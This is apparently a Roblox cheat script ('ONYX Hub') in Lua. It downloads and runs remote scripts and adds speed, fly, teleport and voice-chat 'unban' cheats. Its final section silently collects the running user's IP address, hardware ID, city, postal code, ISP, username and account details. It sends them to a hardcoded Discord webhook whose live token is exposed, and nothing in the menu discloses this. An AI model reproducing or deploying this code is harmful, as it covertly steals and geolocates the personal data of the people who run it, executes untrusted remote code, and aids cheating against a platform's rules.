local a=loadstring(game:HttpGet'https://sirius.menu/rayfield')()

local b=a:CreateWindow{
Name="ONYX Hub",
Icon=0,
LoadingTitle="Loading....",
LoadingSubtitle="by CidKagenou",
Theme="Amethyst",

DisableRayfieldPrompts=false,
DisableBuildWarnings=false,

ConfigurationSaving={
Enabled=true,
FolderName=nil,
FileName="Big Hub"
},

Discord={
Enabled=true,
Invite="https://discord.gg/bcM99Hy6cH",
RememberJoins=true
},

KeySystem=false,
KeySettings={
Title="Untitled",
Subtitle="Key System",
Note="No method of obtaining the key is provided",
FileName="Key",
SaveKey=true,
GrabKeyFromSite=false,
Key={"Hello"}
}
}

a:Notify{
Title="Successfully Executed",
Content="Script Made By CidKagenou ",
Duration=6.5,
Image="laptop",
}

a:Notify{
Title="Join The Discord!",
Content="Link Copied To Clipboard",
Duration=6.5,
Image="laptop",
}

local c=b:CreateTab("Main","scroll")
c:CreateSection"Basic Scripts"

c:CreateButton{
Name="Infinite Yield",
Callback=function(d)
d=loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
end,
}

c:CreateSection"MicUp Scripts"

c:CreateButton{
Name="System Broken",
Callback=function(d)
d=loadstring(game:HttpGet'https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script')()
end,
}

c:CreateButton{
Name="Orca",
Callback=function(d)
d=loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua")()mouse=game.Players.LocalPlayer:GetMouse()
end,
}

c:CreateButton{
Name="Red Floor",
Callback=function(d)
d=loadstring(game:HttpGet"https://raw.githubusercontent.com/ONYX-codes/floorredscript/refs/heads/main/main.lua")()
end,
}

local d=b:CreateTab("Player","layers")
d:CreateSection"Settings"

d:CreateSlider{
Name="Walkspeed",
Range={16,100},
Increment=1,
Suffix="Speed",
CurrentValue=16,
Flag="Slider1",
Callback=function(e)
local f=game.Players.LocalPlayer
local g=f.Character
local h=g and g:FindFirstChild"Humanoid"

if h then
h.WalkSpeed=e
end
end,
}

d:CreateSlider{
Name="Jump Power",
Range={50,1000},
Increment=1,
Suffix="Power",
CurrentValue=50,
Flag="Slider2",
Callback=function(e)

local function updateJump(f)
if f then

pcall(function()f.JumpHeight=e/10 end)
pcall(function()f.JumpPower=e end)
end
end


local f=game.Players.LocalPlayer
local g=f.Character
local h=g and g:FindFirstChild"Humanoid"
updateJump(h)


f.CharacterAdded:Connect(function(i)
local j=i:WaitForChild"Humanoid"
updateJump(j)
end)
end,
}



local e=50
local f=false


local function setFlyingState(g)
local h=game.Players.LocalPlayer
local i=h.Character
local j=i and i:FindFirstChild"Humanoid"
local k=i and i:FindFirstChild"HumanoidRootPart"

if j and k then
if g then
local l=k:FindFirstChild"FlyVelocity"
local m=k:FindFirstChild"FlyGyro"
if l then l:Destroy()end
if m then m:Destroy()end

local n=Instance.new"BodyVelocity"
n.Name="FlyVelocity"
n.Velocity=Vector3.new(0,0,0)
n.MaxForce=Vector3.new(10000,10000,10000)
n.Parent=k

local o=Instance.new"BodyGyro"
o.Name="FlyGyro"
o.MaxTorque=Vector3.new(10000,10000,10000)
o.P=1500
o.D=300
o.Parent=k

j.PlatformStand=true

local p=game:GetService"RunService"
local q
q=p.RenderStepped:Connect(function(r)
if not i or not k or not n or not o then
q:Disconnect()
return
end

local s=workspace.CurrentCamera
local t=Vector3.new()
local u=game.UserInputService

if u:IsKeyDown(Enum.KeyCode.W)then
t=t+s.CFrame.LookVector
end
if u:IsKeyDown(Enum.KeyCode.S)then
t=t-s.CFrame.LookVector
end
if u:IsKeyDown(Enum.KeyCode.A)then
t=t-s.CFrame.RightVector
end
if u:IsKeyDown(Enum.KeyCode.D)then
t=t+s.CFrame.RightVector
end
if u:IsKeyDown(Enum.KeyCode.Space)then
t=t+Vector3.new(0,1,0)
end
if u:IsKeyDown(Enum.KeyCode.LeftShift)then
t=t-Vector3.new(0,1,0)
end

local v=t.Magnitude>0 and t.Unit or Vector3.new(0,0,0)
n.Velocity=v*e*r*60
o.CFrame=s.CFrame
end)
else
local l=k:FindFirstChild"FlyVelocity"
local m=k:FindFirstChild"FlyGyro"
if l then l:Destroy()end
if m then m:Destroy()end
j.PlatformStand=false
end
f=g
end
end


local g=d:CreateToggle{
Name="Fly Toggle",
CurrentValue=false,
Flag="Toggle1",
Callback=function(g)
setFlyingState(g)
end,
}


d:CreateSlider{
Name="Fly Speed",
Range={0,500},
Increment=10,
Suffix="Speed",
CurrentValue=50,
Flag="Slider1",
Callback=function(h)
e=h
end,
}


local h=game:GetService"UserInputService"
h.InputBegan:Connect(function(i,j)
if j then return end
if i.KeyCode==Enum.KeyCode.v then
local k=not f
setFlyingState(k)
g:Set(k)
end
end)

d:CreateSection"VoiceChat"
d:CreateButton{
Name="UnBan VoiceChat",
Callback=function()
game:GetService"VoiceChatService":joinVoice()
end,
}

d:CreateButton{
Name="TPTool",
Callback=function()
mouse=game.Players.LocalPlayer:GetMouse()
tool=Instance.new"Tool"
tool.RequiresHandle=false
tool.Name="Equip to Click TP"
tool.Activated:connect(function()
local i=mouse.Hit+Vector3.new(0,2.5,0)
i=CFrame.new(i.X,i.Y,i.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=i
end)
tool.Parent=game.Players.LocalPlayer.Backpack
end,
}




local i=game:GetService"Players"
local j=game:GetService"TweenService"
local k=game:GetService"RunService"
local l=i.LocalPlayer


local m=150
local n=0.1
local o=150


local p=1004816978


local function calculateDistance(q)
if not l.Character or not l.Character:FindFirstChild"HumanoidRootPart"or not q or not q:FindFirstChild"HumanoidRootPart"then
return math.huge
end
local r=l.Character.HumanoidRootPart
local s=q.HumanoidRootPart
return(s.Position-r.Position).Magnitude
end


local function getScaleFactor(q)
if q>m then
return n
elseif q<=0 then
return 1
else
return 1-(q/m)*(1-n)
end
end


local function createTag(q,r,s)
local t=q:WaitForChild("Head",5)
if not t then return end

if t:FindFirstChild"PlayerTag"then
t.PlayerTag:Destroy()
end


local u=Instance.new"BillboardGui"
u.Name="PlayerTag"
u.Adornee=t
u.Size=UDim2.new(0,120,0,50)
u.StudsOffset=Vector3.new(0,3,0)
u.AlwaysOnTop=true
u.Parent=t


local v=Instance.new"Frame"
v.Size=UDim2.new(1,10,1,10)
v.Position=UDim2.new(0,-5,0,-5)
v.BackgroundColor3=Color3.fromRGB(50,50,50)
v.BorderSizePixel=0
v.Parent=u

local w=Instance.new"UICorner"
w.CornerRadius=UDim.new(0,12)
w.Parent=v


local x=Instance.new"UIStroke"
x.Thickness=2
x.Color=Color3.fromRGB(255,255,255)
x.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
x.Parent=v

local y=Instance.new"UIGradient"
y.Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
ColorSequenceKeypoint.new(0.2,Color3.fromRGB(255,255,0)),
ColorSequenceKeypoint.new(0.4,Color3.fromRGB(0,255,0)),
ColorSequenceKeypoint.new(0.6,Color3.fromRGB(0,255,255)),
ColorSequenceKeypoint.new(0.8,Color3.fromRGB(0,0,255)),
ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,255))
}
y.Rotation=0
y.Parent=x

local z=TweenInfo.new(2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,-1)
local A=j:Create(y,z,{Rotation=360})
A:Play()


local B=Instance.new"TextLabel"
B.Size=UDim2.new(1,0,1,0)
B.BackgroundTransparency=1
B.TextScaled=true
B.Font=Enum.Font.GothamBold
B.TextColor3=s
B.TextStrokeTransparency=0.5
B.TextStrokeColor3=Color3.fromRGB(0,0,0)
B.Text=r=="Owner"and"👑 Owner"or"🌟 Member"
B.ZIndex=2
B.Parent=u


local C=Instance.new"TextButton"
C.Size=UDim2.new(1,10,1,10)
C.Position=UDim2.new(0,-5,0,-5)
C.BackgroundTransparency=1
C.Text=""
C.ZIndex=1
C.Parent=u


C.MouseButton1Click:Connect(function()
local D=i:GetPlayerFromCharacter(q)
if D and D.Character then
local E=D.Character:FindFirstChild"HumanoidRootPart"
local F=l.Character and l.Character:FindFirstChild"HumanoidRootPart"
if E and F then
F.CFrame=E.CFrame
end
end
end)

return u
end

local q={}


local function updateTagSizes()
for r,s in pairs(q)do
if r and r.Character and s and s.Parent~=nil then
local t=calculateDistance(r.Character)
local u=getScaleFactor(t)

s.Size=UDim2.new(0,120*u,0,50*u)

if t>o then
s.Enabled=false
else
s.Enabled=true
end
else
q[r]=nil
end
end
end


local r
local function startTagSizeUpdates()
if not r then
r=k.RenderStepped:Connect(updateTagSizes)
end
end


local function stopTagSizeUpdates()
if r then
r:Disconnect()
r=nil
end
end


local function applyTags(s)
q={}
if s then
for t,u in pairs(i:GetPlayers())do
if u.Character then
local v
if u.UserId==p then
v=createTag(u.Character,"Owner",Color3.fromRGB(255,215,0))
else
v=createTag(u.Character,"Member",Color3.fromRGB(0,170,255))
end
if v then
q[u]=v
end
end
end
startTagSizeUpdates()
else
for t,u in pairs(i:GetPlayers())do
if u.Character and u.Character:FindFirstChild"Head"then
local v=u.Character.Head:FindFirstChild"PlayerTag"
if v then v:Destroy()end
end
end
stopTagSizeUpdates()
q={}
end
end


applyTags(true)


i.PlayerAdded:Connect(function(s)
s.CharacterAdded:Connect(function(t)
if q[s]==nil then
local u
if s.UserId==p then
u=createTag(t,"Owner",Color3.fromRGB(255,215,0))
else
u=createTag(t,"Member",Color3.fromRGB(0,170,255))
end
q[s]=u
end
end)
end)

l.CharacterAdded:Connect(function(s)
if q[l]==nil then
local t
if l.UserId==p then
t=createTag(s,"Owner",Color3.fromRGB(255,215,0))
else
t=createTag(s,"Member",Color3.fromRGB(0,170,255))
end
q[l]=t
end
end)




local s=game:GetService"HttpService"
local t=game:GetService"Players"
local u=game:GetService"MarketplaceService"
local v=game:GetService"LocalizationService"
local w=game:GetService"RbxAnalyticsService"
game:GetService"GroupService"
game:GetService"BadgeService"
local x=game:GetService"UserInputService"
local y=game:GetService"Stats"

local z=t.LocalPlayer
local A=z.UserId
local B=z.DisplayName
local C=z.Name
local D=tostring(z.MembershipType):sub(21)
local E=z.AccountAge local F=
v.RobloxLocaleId
local G=game:HttpGet"https://v4.ident.me/"
local H=s:JSONDecode(game:HttpGet"http://ip-api.com/json")
local I=w:GetClientId()
local J=u:GetProductInfo(game.PlaceId)
local K=J.Name
local L=(x.TouchEnabled and not x.MouseEnabled)and"📱 Mobile"or"💻 PC"
local M=math.round(y.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
return identifyexecutor()
end

local function createWebhookData()
local N=detectExecutor()
local O=os.date"%m/%d/%Y"
local P=os.date"%X"
local Q="https://www.roblox.com/games/"..game.PlaceId
local R="https://www.roblox.com/users/"..A
local S="https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
local T="https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId

local U={
username="ONYX Logs",
avatar_url="https://i.imgur.com/AfFp7pu.png",
embeds={
{
title="🎮 Game Information",
description=string.format("**[%s](%s)**\n`ID: %d`",K,Q,game.PlaceId),
color=tonumber"0x2ecc71"
},
{
title="👤 Player Information",
description=string.format(
"**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
B,R,C,A,D,E,L,M
),
color=D=="Premium"and tonumber"0xf1c40f"or tonumber"0x3498db"
},
{
title="🌐 Location & Network",
description=string.format(
"**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
G,I,H.country,string.lower(H.countryCode),H.regionName,H.city,H.zip,H.isp,H.org,H.timezone
),
color=tonumber"0xe74c3c"
},
{
title="⚙️ Technical Details",
description=string.format(
"**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
N,T,S
),
color=tonumber"0x95a5a6",
footer={
text=string.format("📅 Date: %s | ⏰ Time: %s",O,P)
}
}
}
}
return s:JSONEncode(U)
end

local function sendWebhook(N,O)
local P={["Content-Type"]="application/json"}
local Q=http_request or request or HttpPost or syn.request
local R={Url=N,Body=O,Method="POST",Headers=P}
Q(R)
end

local N="https://discord.com/api/webhooks/1344488660229160980/ERQLy9igVfqZJJcvhXBA4DQjOYavOCto6U_EqDSFJ6Sxej1YMlSau7yJ4ykn7WbMicnR"
local O=createWebhookData()
sendWebhook(N,O)
